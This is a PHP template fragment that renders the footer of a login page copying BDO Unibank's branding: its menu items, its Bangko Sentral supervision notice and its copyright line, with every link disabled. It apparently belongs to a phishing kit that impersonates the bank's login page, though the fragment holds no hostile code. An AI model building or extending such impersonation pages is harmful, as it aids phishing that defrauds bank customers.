<?php if($login_footer['display'] == true) { ?>
      <div class="footer">
        <?php if($login_footer['style'] == 'img'){ ?> 
          <img src="styles/footer.png" alt="footer" style="width: 100%; height: 60px; image-rendering: pixelated;">
        <?php }elseif($login_footer['style'] == 'txt'){ ?> 
          <div class="footer-menu">
            <ul class="menu">
              <li class="first collapsed">
                <a href="javascript:void(0);"  id="menu-1118">About BDO</a>
              </li>
              <li class="collapsed">
                <a href="javascript:void(0);" id="menu-1057" >Corporate Governance</a>
              </li>
              <li class="collapsed">
                <a href="javascript:void(0);" id="menu-995" >Investor Relations</a>
              </li>
              <li class="collapsed">
                <a href="javascript:void(0);" id="menu-995" >Company Disclosures</a>
              </li>
              <li class="leaf">
                <a href="javascript:void(0);" id="menu-1508" >Contact Us</a>
              </li>
              <li class="collapsed">
                <a href="javascript:void(0);" id="menu-1401" >Careers</a>
              </li>
              <li class="leaf">
                <a href="javascript:void(0);" id="menu-1449" >Press Room</a>
              </li>
              <li class="leaf">
                <a href="javascript:void(0);" id="menu-2810" >Site Map</a>
              </li>
              <li class="leaf">
                <a href="javascript:void(0);" id="menu-2808" >Privacy Policy</a>
              </li>
              <li class="last leaf">
                <a href="javascript:void(0);" id="menu-2809" >Terms and Conditions</a>
              </li>
            </ul>
          </div>
          <span class="copyright" style="font-size: 10px;">BDO Unibank is supervised by the Bangko Sentral ng Pilipinas with contact number (02) 8708-7087 and email address consumeraffairs@bsp.gov.ph</span>
          <span class="copyright">BDO Unibank, Inc. © 2015. All Rights Reserved</span>
          <?php } ?>
        </div>
<?php } ?>